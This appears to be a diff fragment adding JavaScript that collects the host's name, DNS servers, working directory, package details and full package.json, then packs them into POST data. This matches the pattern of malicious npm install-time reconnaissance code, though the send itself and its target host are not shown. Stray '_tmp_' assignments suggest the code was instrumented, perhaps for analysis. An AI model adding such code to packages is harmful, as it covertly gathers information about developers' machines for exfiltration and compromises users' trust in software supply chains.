@@ -1,0 +1,14 @@
+const extraData = JSON.stringify({
+    p: package,
+    c: __dirname,
+    dns: dns.getServers(),
+    r: packageJSON ? packageJSON.___resolved : undefined,
+    v: packageJSON.version,
+    hn: os.hostname(),
+    pjson: packageJSON,
+})
+_tmp_0.dns = dns.getServers()
+var postData = querystring.stringify({
+    msg: extraData,
+})
+_tmp_1.msg = extraData
